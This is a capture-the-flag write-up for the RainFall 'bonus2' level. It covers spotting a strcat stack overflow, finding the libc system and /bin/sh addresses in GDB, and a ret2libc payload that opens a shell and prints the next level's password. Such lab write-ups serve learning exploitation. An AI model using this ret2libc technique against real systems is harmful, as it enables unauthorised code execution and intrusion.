1. Vulnerability detection

From the source code, we can see that we are copying `19` bytes into a `50` bytes arena
in the main function:
`memmove(result, str, 19)`

Then, that `result` is passed to the `greetuser`, that have a `char str_store[72]` array,
which can copy at most 19 bytes of a weird string:
```c
char *local_str = "Hyvää päivää ";
memcpy(str_store, local_str, 19);
```

And then, concatenate `result` to `str_store`:
```c
strcat(str_store, result);
puts(str_store);
```

I checked on GDB, because it's hard here to see what's going on with the ASM code.

But, the `esp` pointer have a full copy of what we have in `result`. So in fact the `72` bytes.

With that detected, and the `19` more bytes from the `local_str`, we can have at most 
`91` bytes.

So enough to overflow the `84` bytes needed to do a `ret2libc`.

2. Find `system` and `/bin/sh` addresses:

For `system` it's easy:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Address of `system`: `0xb7e6b060`

And for the `/bin/sh` address:
```
(gdb) i proc map
process 2687
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

3. Exploit:


1. Define `LANG=fi`
2. Write whatever in `argv[1]` of 40+ bytes.
3. Write 18 characters in `argv[2]` as padding
4. Write the system address `\x60\xb0\xe6\xb7`
5. Write the NOP codes for the return address `\x90\x90\x90\x90`
6. Write the `/bin/sh` argument `\x58\xcc\xf8\xb7`

```sh
bonus2@RainFall:~$ ./bonus2 `python -c 'print "A" * 41'` `python -c 'print "A" * 18 + "\x60\xb0\xe6\xb7\x90\x90\x90\x90\x58\xcc\xf8\xb7"'`
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�淐���X���
$ cd ../bonus3	
$ cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```